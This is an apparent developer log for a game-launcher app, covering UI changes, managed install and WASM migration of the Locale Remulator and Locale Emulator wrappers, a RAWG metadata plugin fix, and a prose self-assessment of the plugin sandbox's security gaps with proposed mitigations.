  permanently mislabel a URL. Unbounded, no TTL - values are tiny (a resolved boolean per URL),
  not worth an eviction policy at this scale.
- Also added an `isReady` flag to the composable - without it, `reverseText`/`wantsReverse`
  briefly rendered against the default `isDark = false` guess before the real result landed,
  flashing the wrong (pre-flip) color. `.info.text-pending { color: transparent }` hides
  title/meta/description during that window instead (transparent, not
  `visibility`/`display`, so no layout reflow once the real color is known).

`bun run build` clean throughout.

**Added a cross-fade transition between `GameDetail` and the grid/list browse view.**
`App.vue`'s `v-if="library.viewingGame"` swap between `<GameDetail>` and `<GameFilters>` +
`<GameGrid>`/`<GameList>` was an instant, jarring cut - wrapped both branches in a single
`<Transition name="detail" mode="out-in">` (the grid/list branch needed a wrapping
`<div class="library-browse">` first, since `Transition` needs exactly one root node per
branch; `display: contents` on that wrapper keeps it a pure passthrough with no layout effect
of its own). `mode="out-in"` waits for the old view to fully fade out before the new one fades
in, so they never both occupy `.content`'s scroll position at once. 0.15s opacity-only
cross-fade.

**Widened `.game-detail`'s max-width, on user report ("the detail page seems narrow when
maximized").** 720px (a single-column reading width) left the actual two-column layout
(`.sticky-side` + `.info`) looking cramped on a maximized window - widened to 1200px, the
standard wide-content max-width (Bootstrap's `container-xl`/Tailwind's `max-w-7xl` range).

**Edit form pass**, several small requests in sequence:
- `.tags`'s own `margin-bottom` moved to `.tags-section` instead (edit mode only needed it on
  the section wrapper, not the tag-pill row itself, which the view-mode side also reuses).
- Platform + Executable path put in one row (new `.field-row`, flex). Platform tried a few
  widths (fixed 160px, then `fit-content`, then `max-content`) before landing on a completely
  different direction: not an editable field at all. `<span>`s (view page's `.meta` and the
  edit form) now show the game's actual source-plugin brand icon instead of raw platform text.
  - New `iconForPlatform()` - a `switch` with one arm per known platform id (`"steam"`,
    `"gog"`, `"epic"` - the exact lowercase literals each of `steam-source-wasm-plugin`,
    `gog-source-wasm-plugin`, `epic-source-wasm-plugin`'s own `lib.rs` hardcodes) plus a
    `default` wildcard arm, mirroring a Rust `match`'s `_ => ...` - returns a
    `PlatformIcon` discriminated union (`{ kind: "brand", path, title }` from the new
    `simple-icons` dependency, or `{ kind: "generic", title }` for the `default` arm, rendered
    as Tabler's `IconDeviceGamepad2`). Covers manually-added games (`platform` is `null` -
    `games.add()` never writes a value there at all) and any unrecognized string the same way.
  - Checked all three platforms' actual trademark/brand guidelines before using their logos at
    all: Steam's says the logo "may not be combined with any object" and can't imply
    endorsement; Epic's says don't alter the logo's colors; GOG's wants legible, non-subordinate
    sizing. Judged low-risk for a local, non-commercial personal tool showing a single small
    monochrome glyph (standard practice among game launchers), but honored Epic's specifically:
    `epicIconFill` forces strict `#000000`/`#ffffff` (never `currentColor`'s arbitrary
    theme-tinted hex) for that one icon, derived the same way `--color-text-reverse`'s own
    direction is (`themeIsLight`/`wantsReverse`).
  - Executable path and Release date inputs made `readonly` (still populated/submittable, just
    not user-editable) - both are planned to get dedicated pickers later (a file-browse dialog,
    a calendar input) rather than raw text entry.
  - Title/Platform/Executable path's `<label>` captions dropped in favor of placeholder text.
    Title restyled to match the view page's plain `<h1>` (2em/bold/margin, no input chrome) -
    needed `.edit-form input.title-input` (not just a bare class) to out-specificity
    `styles.css`'s own global `input:not([type="checkbox"]):not([type="radio"])` rule, which was
    otherwise winning the font-size cascade. Given a dashed `border-bottom` afterward as the
    one remaining "this is a field" cue, since it no longer looks like the rest of the form's
    boxed inputs.

**Description rendered as sanitized Markdown**, on request ("make description
markdown-compatible"). New `marked` + `dompurify` dependencies - `marked.parse()` (sync mode)
converts the stored Markdown source to HTML, `DOMPurify.sanitize()` before `v-html`, since this
text can originate from metadata provider plugins (IGDB/RAWG/TheGamesDB), not just what the
user typed - untrusted input as far as XSS goes, same reasoning as any other externally-sourced
HTML injection point. The edit-mode textarea is unchanged - still edits the raw Markdown
source directly; its label now reads "Description (Markdown supported)". Added minimal
`:deep()` styling for the rendered output's `p`/`ul`/`ol`/`a`/`code` (not scoped-reachable
otherwise, since `v-html` content isn't template-authored).

`bun run build` clean throughout this whole pass.

## Milestone 10 — LR/LE Managed Install + WASM Migration
Two LR/LE-focused workstreams combined into one milestone rather than spread across a later separate pass, since both touch the same two wrappers.

**Managed install.** Both wrappers currently require the user to manually download a zip from GitHub, extract it themselves, and paste the resulting `LRProc.exe`/`LEProc.exe` path into Settings (see Milestone 7) - true auto-detection isn't possible since neither leaves a discoverable registry footprint at an arbitrary user-chosen extraction path. This solves that a different way: have the app own the extraction location instead of guessing where the user put it. Distinct from the earlier "don't auto-run a third-party installer" decision for `LRInstaller.exe` - this downloads a portable zip and extracts it ourselves, no elevation or system install involved.
- Rust command to fetch the latest release asset download URL from each project's GitHub Releases API (`InWILL/Locale_Remulator`, `xupefei/Locale-Emulator`) via `reqwest` — new `wrapper_installer.rs`, `latest_locale_remulator_download_url`/`latest_locale_emulator_download_url` hit `GET /repos/{owner}/{repo}/releases/latest` and pick the first `.zip` asset (confirmed against real releases that both projects ship exactly one zip per release, no per-arch variants to disambiguate). Needed an explicit `User-Agent` header - GitHub's API rejects requests without one. Tested with real `#[test]`s hitting the actual GitHub API (not mocked), both pass
- Download + zip extraction into an app-data-managed directory (`<app data>/wrappers/<wrapper_id>/`) — new `zip_install.rs` module shared with `wasm_plugin_installer.rs` (refactored to use it too, rather than duplicating the download-extract-atomic-rename shape now that there were two real call sites). Split into three steps (`download_bytes`, `extract_zip`, `replace_dir`) rather than one all-in-one function, since `wasm_plugin_installer.rs` needs the raw bytes in hand for its SHA256 check before ever extracting anything. A real end-to-end `#[test]` (actual download against Locale Remulator's real latest release, not a mocked zip) caught a genuine bug immediately: the assumption that the zip's contents sat flat at its root was wrong - LR's real release zip wraps everything in a `Locale_Remulator.1.6.0/` folder matching the archive name, so `LRProc.exe` ended up one level deeper than expected. Fixed with `zip_install::unwrap_single_subdir` (if the extracted staging dir contains exactly one entry and it's a directory, treat that as the real content root) - added to the shared module since `wasm_plugin_installer.rs` would hit the identical bug for any real third-party bundle built by zipping a folder the normal OS-GUI way, not just for wrapper installs. `install_wrapper_to` (the actual download+extract logic) was kept `AppHandle`-free specifically so this could be a real test rather than a compiles-clean check, mirroring the `wasm_plugin_runtime.rs`/`instantiate_from_paths` pattern from Milestone 8
- Auto-fill wrapper paths + "Install" button, done together since one has no way to be exercised without the other. `appSettings.ts` gained `installLocaleRemulator`/`installLocaleEmulator` actions: fetch the latest release URL, call `install_wrapper`, then `setLocaleRemulatorPath`/`setLocaleEmulatorPath` with `${dir}\\LRProc.exe`/`${dir}\\LEProc.exe` appended - success/failure reported via `useToastStore` rather than the local error patterns used elsewhere, matching how `library.ts` already reports its own async action errors. `AppSettings.vue` gained an "Install" button next to the existing "Download" link-out button for each wrapper (both stay available - manual download/paste still works for anyone who'd rather not trust the managed flow), disabled with an "Installing..." label while in flight
- Real testing after the above surfaced two more genuine gaps, both fixed:
  - Neither release zip ships `LRConfig.xml`/`LEConfig.xml` - confirmed via `unzip -l` on real downloads, both projects only generate them when their own `LREditor.exe`/`LEGUI.exe` first runs, which managed install deliberately never does. Since these files are purely local round-trip data our own code writes and reads back (never anything LR/LE's "official" defaults need to match), `wrapper_installer.rs` now seeds a minimal default profile pair (`seed_default_config_if_missing`, self-generated GUIDs via the `uuid` crate) if no config already exists, never clobbering a real one
  - Seeding the config alone still wasn't enough for Locale Emulator - a real end-to-end test (seeded GUID, a real installed game) showed `LEProc.exe` failing immediately with `FileNotFoundException: Could not load ... 'LECommonLibrary, Version=0.0.0.0, ...'`, a versionless strong-name load - the standard signature of a GAC-resolved assembly. Confirmed `LECommonLibrary.dll` is never shipped in any LE release zip (checked v2.4.0.0 through current v2.5.0.1) and isn't in the separate `Locale-Emulator-Core` repo either (that one only covers the native `Loader`/`LoaderDll`/`LocaleEmulator` hook libs, already present). Only `LEInstaller.exe` provides it, by GAC-registering a copy during install. First attempt extracted the DLL directly out of `LEInstaller.exe`'s embedded .NET resources via PowerShell reflection and dropped it next to `LEProc.exe` as a loose file (relying on .NET's same-directory assembly probing, which resolves before the GAC) - this worked end-to-end, but repackaging a resource the installer never exposes as a standalone artifact raised a licensing question with no clean answer, so it was replaced with `run_wrapper_installer`, which just launches the real, unmodified `LRInstaller.exe`/`LEInstaller.exe` and lets its window show in front of the user, same as if they'd downloaded and run it manually. LR's `LRProc.exe` needed no equivalent fix on its own (confirmed working standalone via a direct CLI test before LE's bug was even found - `LRInstaller.exe` only registers an optional right-click context-menu extension) but is run through the same command anyway, for one consistent install story across both wrappers rather than two different ones
  - Also added an explicit `.current_dir(...)` (LR/LE's own install folder) to both `launch_via_locale_remulator`/`launch_via_locale_emulator`'s `Command::spawn()` calls while investigating, since LRProc/LEProc resolve their config XML relative to their own directory rather than the caller's cwd - not confirmed as the actual cause of anything (a direct CLI test worked without it too), but explicit is safer than relying on inheriting whatever cwd the host app happens to have
- Merged the two per-wrapper "Install" buttons into one `installWrappers()` action/button (`AppSettings.vue`) once both were using the same download-extract-then-run-installer shape - most users setting up either wrapper want both. The per-wrapper path fields and manual "Download" fallback links stay as they were
- The initial merge still popped both installer windows up nearly simultaneously despite calling the two installs sequentially in JS - `run_wrapper_installer` used `Command::spawn()`, which returns as soon as the process *starts*, not when the user finishes with it, so the `await` in `installWrappers()` wasn't actually waiting for anything meaningful. Fixed by switching to `Command::status()` (blocks until the child exits) run inside `tauri::async_runtime::spawn_blocking` so it doesn't stall the async runtime - now each installer's window has to be closed before the next one opens. Reordered to run LE first (the one that actually needs its installer for `LECommonLibrary.dll`'s GAC registration) then LR, and split the single try/catch into one per wrapper so a failure in either is toasted independently and doesn't stop the other from being attempted
- With the managed install flow fully working, the manual path textbox + "Download" link-out button in `AppSettings.vue` stopped earning their keep - removed both, along with `setLocaleRemulatorPath`/`setLocaleEmulatorPath`/`wrapperPathValid` from the store's public surface (kept as internal helpers). Replaced with a plain read-only Installed/Not installed line per wrapper next to the single "Install Compatibility Wrappers" button
- Two follow-up reports after that landed, both real:
  - `EditGameModal`'s wrapper-profile dropdown didn't pick up new GUIDs right after a reinstall - the exact same staleness bug as `localeRemulatorFound`/`localeEmulatorFound` (a value-keyed `watch` on a path that no longer changes between installs), just a second, independent copy of the pattern that had been living in `EditGameModal.vue` as local `lrProfiles`/`leProfiles` refs. Fixed the same way: moved `lrProfiles`/`leProfiles` into the store, refreshed by the same `refreshWrapperStatus()` call (now also lists both wrappers' profiles alongside the found/not-found check) rather than a per-component watch. `EditGameModal.vue` now just reads `appSettings.lrProfiles`/`leProfiles` directly - one shared, always-current copy instead of every modal instance keeping its own possibly-stale one
  - Checked whether `run_wrapper_installer` running the real `LRInstaller.exe`/`LEInstaller.exe` makes `seed_default_config_if_missing`'s self-generated default profile redundant, since the assumption was the installer might now be creating the config itself - it doesn't. Confirmed by reading the live `LRConfig.xml`/`LEConfig.xml` after a real install: still exactly the app's own seeded template, untouched by the installer windows (consistent with `LRInstaller.exe` only registering a shell context-menu extension and `LEInstaller.exe` only GAC-registering `LECommonLibrary.dll` - neither is `LREditor.exe`/`LEGUI.exe`, the actual profile editors). Seeding stays as-is; it's also already non-destructive by construction (`seed_default_config_if_missing` only ever writes when no config file exists yet, never overwriting a real one)
- That surfaced a real staleness bug: the found/not-found status was previously a local `ref` in `AppSettings.vue`, recomputed by a `watch` keyed on `appSettings.localeRemulatorPath`/`localeEmulatorPath` changing. `install_wrapper` always resolves to the same deterministic managed-directory path, though, so a *reinstall* never actually changes that ref's value - Vue's watcher never re-fires, and the status silently goes stale even though the file on disk just changed. Fixed by moving the check into the store itself (`localeRemulatorFound`/`localeEmulatorFound` refs, `refreshWrapperStatus()`) and calling it explicitly - once on `init()`, and again in `installWrappers()`'s `finally` block - rather than relying on a value-change watch to notice a fact that isn't reflected in the value at all
- Integrity check before extracting: neither project's GitHub releases carry a published checksum (confirmed against the real API response - the `digest` field GitHub auto-computes for some uploads is `null` for both repos' assets), so there's no external hash to verify against the way `wasm_plugin_installer.rs`'s `expected_sha256` does for user-pasted plugin URLs. What the release API does give is the asset's byte `size`, which is a real signal against a truncated/corrupted download (not against tampering - HTTPS to github.com already covers that, and there's no untrusted third-party source in this flow to defend against the way there is for arbitrary plugin URLs). `latest_release_zip_asset` (renamed from `latest_release_zip_url`) now returns `{ url, size }` instead of a bare URL string; `install_wrapper_to`/`install_wrapper` take an `expected_size: Option<u64>` and reject the install before ever extracting if the downloaded byte count doesn't match. `appSettings.ts` threads the size through from the release-info fetch to the install call. Verified with a real test (`rejects_a_download_that_does_not_match_the_expected_size`) that deliberately passes `asset.size + 1` against a real download and asserts both that the install errors and that nothing gets extracted to `final_dir`

**WASM migration.** Moved here from Milestone 9 - makes more sense running alongside the managed-install work than as a separate later pass, since both are LR/LE-focused. Unlike Steam/GOG/Epic, LR/LE weren't `SourcePlugin`s - they were special-cased directly in `library.ts`'s `launchGame()` via `games.locale_wrapper`/`locale_profile_guid`, not modeled as any `PluginBase` kind at all. Real design work, not just a port.
- New `wrapper` plugin kind, the first one built for something other than a source of games. WIT: `wrapper-plugin` interface (`list-profiles`/`launch`), reusing the existing `host` import - no new host primitives needed, `read-file`/`spawn-process` already cover what LR/LE's launch logic needs. Unlike Steam/GOG (auto-detected via the registry, no configuration needed), LR/LE are portable installs with no discoverable location, so `list-profiles`/`launch` both take the wrapper's own exe path (`proc-path`) as an explicit argument rather than trying to push path storage into the guest - the host (`appSettings.ts`) already owns that path from the managed-install flow, no reason to duplicate it
  - `wasm_plugins.rs` needed a second `bindgen!` invocation for the new `wrapper-plugin-world` alongside the existing `source-plugin-world` one. First attempt tried sharing the generated `host` module between the two via bindgen's `with` mapping (avoiding a second copy of the host types) - this doesn't work here because bindgen only generates record types a world's exports actually reference, and `source-plugin-world` never references `locale-profile` (only `wrapper-plugin-world` does), so the shared module ended up missing the type wrapper-plugin needed. Settled on two fully independent bindgen invocations instead; since the `host` interface's own functions never take `game-entry`/`locale-profile` as parameters, the two generated `Host` traits are structurally identical regardless, so `PluginHostState` now has its actual logic in private `do_*` inherent methods with two thin trait impls delegating to them - one copy of the logic, two trait bindings
  - Selection semantics: multi-enable like `source`/`metadata`, not exclusive like `theme`/`controller` - a user can have both LR and LE plugins enabled at once (`EditGameModal`'s dropdown already merged profiles from both before this migration)
- Ported `locale_remulator.rs`/`locale_emulator.rs`'s `list_profiles`/`launch` logic into two new sibling repos, `locale-remulator-wasm-plugin`/`locale-emulator-wasm-plugin` (plugin ids `locale-remulator-wasm`/`locale-emulator-wasm`) - same "real separate repo, not living inside the host app" reasoning as `steam-source-wasm-plugin`/`gog-source-wasm-plugin`. XML parsing via `roxmltree` (already a host-side dependency, compiles fine to `wasm32-wasip1` with no changes needed, same as `keyvalues-parser` did for the Steam port). Verified end-to-end against the real installed `LRProc.exe`/`LEProc.exe` and a real test game via a temporary `#[test]` in `wasm_plugin_runtime.rs` (removed after confirming, not committed) - both plugins correctly listed the real seeded profiles and successfully launched the game through both wrappers, matching the manual CLI verification from earlier in this milestone
- Wired the `wrapper` kind through the same pipes every other kind uses: `manifest.ts`'s `PluginKind` union, `loader.ts`'s WASM-manifest filtering (previously hardcoded to only allow `"source"`) and a `createWasmWrapperPlugin` factory, a new `wrapperPlugins.ts` store (mirrors `metadataProviders.ts`'s multi-enable shape, plus a `profiles` list flattened across every enabled plugin and a `launch(pluginId, guid, executablePath)` action), and a new "Wrapper" tab in `PluginSettings.vue`. `procPathFor()` maps the two known wrapper plugin ids to `appSettings.ts`'s existing `localeRemulatorPath`/`localeEmulatorPath` fields rather than building a fully generic per-plugin path-storage mechanism for a set of exactly two plugins
- `games.locale_wrapper` used to store the literal `"lr"`/`"le"` - now stores a wrapper plugin id. Migration v8 rewrites existing rows (`"lr"` → `"locale-remulator-wasm"`, `"le"` → `"locale-emulator-wasm"`) so already-configured per-game wrapper selections keep working after the switch. Since LR/LE launching was always-on before this migration (no enable/disable toggle existed), `wrapperPluginStore` defaults both new plugin ids to enabled (`DEFAULT_WRAPPER_IDS`, same pattern as `metadataProviders.ts`'s `DEFAULT_PROVIDER_IDS`) rather than leaving already-migrated games pointing at a wrapper plugin the user would otherwise have to know to go enable
- `library.ts`'s `launchGame()` lost its hardcoded `if (locale_wrapper === "lr") ... else ...` branch entirely, replaced by one `wrapperPlugins.launch(game.locale_wrapper, ...)` call - same simplification Steam/GOG's migration gave `plugins.ts`'s scan dispatch
- Built-in `locale_remulator.rs`/`locale_emulator.rs` retired the same way `steam.rs` was: `locale_emulator.rs` deleted outright (both its exports fully replaced), `locale_remulator.rs` trimmed to just `wrapper_path_exists` (still needed - shared by both wrappers' Found/Not-found status check, unrelated to which plugin does the actual launching)
- Two staleness-class bugs (same shape as Milestone 10's earlier `localeRemulatorFound`/`lrProfiles` fixes) had to be headed off proactively rather than found after the fact this time: `wrapperPluginStore.profiles` needs an explicit refresh after `installWrappers()` completes, same reasoning as `appSettings.refreshWrapperStatus()` - a reinstall can change `LRConfig.xml`/`LEConfig.xml`'s GUIDs without the underlying path value ever changing. Rather than having `appSettings.ts` reach into `wrapperPlugins.ts` (which already depends on `appSettings.ts` for `procPathFor`, so that direction would be circular), `AppSettings.vue`'s install button handler calls both stores' refreshes itself
- Real bug from real testing (user built the app and checked Settings): both wrapper plugins showed up under the Source tab too, and Steam (WASM)/GOG (WASM) leaked into the new Wrapper tab. `loader.ts`'s `getInstalledWasmManifests` refactor (adding `wrapper` alongside `source` to `WASM_SUPPORTED_KINDS`) accidentally filtered installed WASM manifests by "is this kind WASM-supported at all" instead of "does this kind match what was actually requested" - `.filter((m) => WASM_SUPPORTED_KINDS.includes(m.kind))` needed to be `.filter((m) => kind ? m.kind === kind : WASM_SUPPORTED_KINDS.includes(m.kind))`. Also renamed `locale_remulator.rs` → `wrapper_paths.rs` (flagged by the same real-testing pass as confusing - the file had already been trimmed down to just the shared `wrapper_path_exists` check, nothing LR-specific left in it)
- Moved the managed-install UI from one combined button in `AppSettings.vue` (`installWrappers()`, download+run-installer for both LR and LE together) to each wrapper plugin's own `settingsComponent` in the Wrapper tab - now that LR/LE are real plugins, they get the same per-plugin settings-UI slot IGDB's API-key form already uses, rather than a special-cased global settings section. `appSettings.ts`'s `installLocaleRemulator`/`installLocaleEmulator` split their shared `installingWrappers` flag into independent `installingLocaleRemulator`/`installingLocaleEmulator` ones and now own their own try/catch/toast directly (previously that lived one level up in `installWrappers`, which is now deleted - no longer needed once installing became two independent user-triggered actions instead of one sequenced pair). New `WrapperInstallStatus.vue` (Found/Not-found status + Install button, parameterized by a `wrapperId` prop) is pre-bound to each of the two known wrapper plugin ids via `defineComponent`/`h()` in `loader.ts`'s `createWasmWrapperPlugin`, since `settingsComponent` is rendered with no props (`<component :is="..." />`) - same "exactly two wrapper plugins, hardcode the pairing" pragmatism as `wrapperPlugins.ts`'s `procPathFor`. `AppSettings.vue` now only has the Big Picture auto-launch checkbox left
- **Full detachment follow-up.** After the above, `wrapper_installer.rs` (download/extract/config-seed/run-installer) and `wrapper_paths.rs` (`wrapper_path_exists`) still lived host-side - real per-integration logic (GitHub URLs, `LRConfig.xml`/`LEConfig.xml`-shaped defaults) in the exact "bespoke Rust module per integration" shape the WIT `host` interface's own doc comment already rejects for source plugins (`steam.rs` was fully deleted once ported; this hadn't gotten the same treatment). Closed the gap by expanding the host capability surface rather than accepting the asymmetry:
  - New `host` functions: `write-file`, `remove-dir`, `run-and-wait` (blocking spawn, for a visible installer window), `download-bytes` (binary - `http-get` returns `string`, unusable for a zip), `extract-zip`/`unwrap-single-subdir`/`replace-dir` (thin WIT wrappers around the existing `zip_install.rs` functions - zip *parsing* stays host-side and shared across every plugin doing a zip install, rather than compiling the `zip` crate into every guest; only the *orchestration* - which URL, what filename, what installer to run - moves to the plugin, which is the part that was actually LR/LE-specific), and `plugin-dir` (a plugin's own writable directory under `<app data>/wasm-plugins/<id>/`)
  - `wrapper-plugin` interface gained `install()`/`is-installed()` exports and dropped `proc-path` entirely from `list-profiles`/`launch` - since `install()` always installs to (and every other export always resolves) the same deterministic `plugin-dir()/install/` location, there's nothing left for the host to own or pass in. `PluginHostState` gained a `plugin_dir: PathBuf` field (threaded in from `wasm_plugin_runtime.rs`'s already-known instantiation path) to back `plugin-dir()`
  - Both plugin repos rewritten to own their full lifecycle: GitHub release lookup + JSON parsing (`serde_json`, compiles to `wasm32-wasip1` with no changes) and GUID generation (`uuid` v4 - needed `getrandom`'s WASI support, also just worked) moved from host Rust into the guest, alongside the existing XML profile parsing
  - `do_http_get`/`do_download_bytes` needed a `User-Agent` header added (previously only `wrapper_installer.rs`'s own dedicated reqwest client set one) - GitHub's API rejects requests without one, and the guest has no way to set custom headers itself through `http-get`'s plain-URL signature
  - Verified for real, not just compiled: real end-to-end `#[test]`s (temporary, not committed) drove each plugin's actual `install()` through a real GitHub fetch, download, extract, and `LRInstaller.exe`/`LEInstaller.exe` launch - since `run-and-wait` blocks until the window closes, each test run was paired with a polling loop that waited for the installer process to appear then force-closed it (mirroring a user closing the window), unblocking the test. This caught a real regression before it shipped: `do_run_and_wait` checked the child's exit status and treated a non-zero one as failure, which is exactly the bug already fixed once before in this same milestone (LR/LE's installer windows aren't real wizards - exit code isn't a meaningful success signal, only whether the process could be spawned at all is). Fixed by dropping the status check entirely, matching the original `run_wrapper_installer`'s behavior. After the fix, both plugins passed real installs end to end: GitHub fetch → download → size check → extract → config seed → installer window → real profiles → real game launch
  - `wrapper_installer.rs` and `wrapper_paths.rs` deleted from the host app entirely; `uuid` and `roxmltree` dropped from the host's own `Cargo.toml` (both now guest-only dependencies). `appSettings.ts` lost every wrapper-related field (`localeRemulatorPath`/`localeEmulatorPath`/`*Found`/`installing*`/`install*`) - down to just the Big Picture auto-launch setting. `wrapperPlugins.ts` lost `procPathFor()` entirely. `loader.ts`'s `createWasmWrapperPlugin` now builds a generic `settingsComponent` bound to the specific plugin instance instead of a hardcoded per-id lookup - any future wrapper plugin gets an Install button for free, no host-side wiring needed. The now-obsolete host-managed `<app data>/wrappers/` directory and orphaned `locale_remulator_path`/`locale_emulator_path` settings rows were cleaned up too
- **`Installable` generalization.** The Install-button component was still typed to `WrapperPlugin` specifically even though nothing about it (Found/Not-found status, an Install button, `install()`/`isInstalled()`) is actually wrapper-specific - any plugin kind that manages its own downloaded dependency could reuse it. Pulled `install()`/`isInstalled()` out into a standalone `Installable` interface (`src/plugins/types.ts`) any `PluginBase` can compose with (`WrapperPlugin extends PluginBase, Installable`), renamed `WrapperInstallStatus.vue` → `InstallableStatus.vue` (now typed to `PluginBase & Installable`, no wrapper knowledge at all), and added an `installable?: boolean` flag to `PluginManifest` so the loader can tell which plugins opt in without guessing from `kind`. `loader.ts` gained `attachInstallableStatus()`, called generically after loading any TS-authored plugin: if the manifest is tagged `installable`, the plugin didn't set its own `settingsComponent`, and it actually implements `install`/`isInstalled`, it gets the generic component for free - covers any future TS plugin of any kind. `createWasmWrapperPlugin` still sets its own `settingsComponent` explicitly (takes precedence over the generic fallback) since it needs an extra `onInstalled` hook to refresh `wrapperPlugins.profiles` after a fresh install - kept as an optional prop on the generic component itself (a caller-supplied callback, not baked-in wrapper knowledge) rather than special-casing it in `InstallableStatus.vue`.
  - Deliberately scoped to the TS/frontend layer only. The WASM/WIT side can't get the same "any kind, opt-in" treatment without real design work: a WIT world's exports are all-or-nothing, so adding `install`/`is-installed` to e.g. `source-plugin-world` would force every existing source plugin (`steam-wasm`, `gog-wasm`) to implement them just to keep instantiating. `wrapper-plugin-world` gets to have them because every wrapper plugin needs them; a true cross-kind opt-in for WASM plugins would need per-kind world variants, not attempted here since there's no second installable WASM kind yet to justify it
- **Uninstall.** `Installable` gained `uninstall()` alongside `install()`/`isInstalled()` - `InstallableStatus.vue`'s button is now a real toggle (Install ⇄ Uninstall) keyed off the current Found/Not-found state, rather than Install-only with no way back short of deleting files by hand. `wrapper-plugin`'s WIT `uninstall` export is trivial for both plugins (`host::remove-dir` on their own `install_dir()` - nothing else to clean up, no registry entries or other host-managed state to unwind). The `onInstalled` prop/hook was renamed `onInstallChanged` and now fires after either direction, so `wrapperPlugins.profiles` gets cleared out on uninstall too, not just repopulated on install. Verified for real against the actual live installs (not a temp dir): a temporary `#[test]` drove `uninstall()` against both already-installed plugins in `<app data>/wasm-plugins/`, confirmed `is_installed()` flips to `false` and the `install/` directory is actually gone, then was removed - both wrappers are left genuinely uninstalled afterward, a clean state for exercising the new toggle through the real UI

## Milestone 11 — RAWG Metadata Provider (stretch)
`proposal.md` names IGDB/SteamGridDB/RAWG as metadata sources; only the first two exist. Low-effort relative to when the proposal was written, since Milestone 7 already generalized metadata providers into a proper multi-enable plugin kind - this is just a new plugin against existing architecture, not new infrastructure.

Milestone written before the M9 SGDB/IGDB WASM migration (still described a built-in `rawg.rs` + `src/plugins/rawg/`) - updated to follow that precedent instead: a standalone `rawg-metadata-wasm-plugin` repo, same shape as the existing two (`metadata-plugin-world`, `http-request`, `settingsSchema` for the API key). Scaffolded directly off `igdb-metadata-wasm-plugin`'s files (same `wit/plugin.wit`, `.gitignore`, `.vscode/settings.json`, `publish.yml`) rather than re-deriving them. Text-only scoping (description/genres/release date, no art) matches IGDB's own reasoning - SteamGridDB stays the only art source.

RAWG's search endpoint doesn't return the full description - only `/api/games/{id}` has `description_raw` - so a lookup takes two requests: search (also carries `released`/`genres`, no second call needed for those) to resolve an id, then a detail fetch for the description text. `search_game`/`fetch_description` in `src/lib.rs`.

Real end-to-end testing (live API key) caught a genuine bug: searching "A Dance of Fire and Ice" returned the game's description with a completely unrelated "NOTE: Unity plugins will only work in Firefox/Safari/IE now..." browser-compatibility notice that doesn't appear on the actual game's RAWG page. Traced with a direct `curl` against RAWG's API (using the key already stored in the local `settings` table, read directly from `library.db` for debugging) rather than guessing: RAWG's search ranks by its own relevance score, not popularity/exactness, and for this query an obscure 2014 itch.io prototype ("A Dance of Fire and Ice (itch)", id 92339, 0 rating, 6 adds) outranks the real 2019 release (id 279033, rating 4.19, 407 adds) - `search_game`'s original `.next()` (first result) picked the prototype, whose own listing genuinely carries that stray note in its `description_raw`. Fixed by widening the search to 5 candidates (`page_size=5`) and preferring an exact case-insensitive `name` match over the raw relevance order, falling back to the first result only when nothing matches exactly - the real release's RAWG listing name is exactly "A Dance of Fire and Ice" with no suffix, so this reliably picks it. Confirmed via the same direct API check that id 279033's `description_raw` has no stray note. Considered `ordering=-added` as an alternative fix first but ruled it out after testing - RAWG's `ordering` param overrides search relevance entirely rather than combining with it, returning globally popular games unrelated to the query. Version bumped 0.1.0 → 0.1.1 (patch, bug fix, no manifest change)

This single-`fetch_metadata` design (and `search_game`/`fetch_description`, named above) was superseded shortly after by the metadata-plugin interface v2 redesign (`search-candidates`/`fetch-metadata-by-id`, 0.2.0) - see the Milestone 14 entry for the full multi-provider story (combined candidate picker, per-candidate thumbnails, exact-match filtering applied to IGDB/SteamGridDB too). Milestone closed out: merge-priority behavior against IGDB (first-non-null-wins in `enabledIds` order) was exercised for real throughout that work - both providers enabled simultaneously, live fetches against real games, and the exact tie-break mechanism confirmed directly when asked - rather than needing a dedicated one-off test.

## Milestone 15 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
`proposal.md` lists these alongside Epic/GOG as source-plugin candidates; never scheduled. Each needs its own research pass (install detection method, manifest/registry format, launch mechanism) before implementation - unlike Epic/GOG, none of these were investigated during Milestone 7. Originally slotted into the core roadmap's own numbering; moved to the Post-1.0 Roadmap once 1.0 shipped with this untouched (see that milestone's own entry below for the move itself).

## Milestone 12 — WASM Plugin Capability Sandboxing (security)
Opened directly out of Milestone 8's install-by-URL redesign (see that section) - writing the confirm dialog's warning copy forced an honest look at what the WASM sandbox actually protects against, and the answer was less than the "sandboxed" framing implied.

Checked `wasm_plugins.rs`'s real `Host` trait implementations, not just the WIT interface's doc comments. `do_read_file`/`do_write_file`/`do_remove_dir`/`do_list_dir`/`do_path_exists` are literally `std::fs::*` called on a caller-supplied path with no scoping at all - a plugin can read/write/delete anywhere the OS account can reach (SSH keys, browser cookie DBs, wallet files, arbitrary overwrites). `do_spawn_process`/`do_run_and_wait` run any executable path with any args - full arbitrary code execution, no allowlist. `do_read_registry_string`/`do_list_registry_keys` read arbitrary registry hives/paths. `http-get`/`download-bytes` let a plugin exfiltrate whatever it read or beacon out.

wasmtime's Component Model sandbox is real but narrower than it sounds: it guarantees memory safety (a plugin can't corrupt host memory or escape its own linear memory), not capability restriction. None of the host functions exposed through `wit/plugin.wit` are currently capability-scoped, so a syntactically valid, non-corrupt `.wasm` component that passes every sanity check (parses, loads, exports the right interface) can still do real damage simply by calling `spawn-process`/`write-file`/etc. with attacker-chosen arguments - the WASM boundary here is an ABI/portability boundary between host and guest, not a security boundary against a guest that's already trusted enough to be loaded. Net: today, installing a WASM plugin from an untrusted URL carries the same real-world risk as running an arbitrary downloaded `.exe`.

Two real mitigations identified, not yet implemented (tracked as open Milestone 12 items):
- **Path allowlisting** - scope the file/registry primitives to a plugin-declared directory allowlist (e.g. `plugin-dir()` plus whatever install paths a source plugin legitimately needs to scan) instead of accepting arbitrary absolute paths. This is real OS-level sandboxing, enforced host-side regardless of what the guest tries.
- **Permission gating on `spawn-process`/`run-and-wait`** - surface an explicit, visible "this plugin wants to run other programs" grant before install (mobile-app-permission-style) rather than silently allowing it. Doesn't stop a malicious plugin from calling it, but removes the silent part - nothing runs without the user having seen and agreed to that specific capability.

Both are real architecture changes (every existing plugin - Steam/GOG/Epic/LR/LE - relies on `spawn-process` and/or registry reads today), not a quick patch, so scoped as their own milestone rather than folded into Milestone 8's already-closed items. Explicitly out of scope even after both land: this closes "one malicious plugin can quietly own the whole machine," not a full app-store-grade trust model (no code signing, no review/moderation step, no revocation) - that would be a distinct, larger tier if ever wanted.

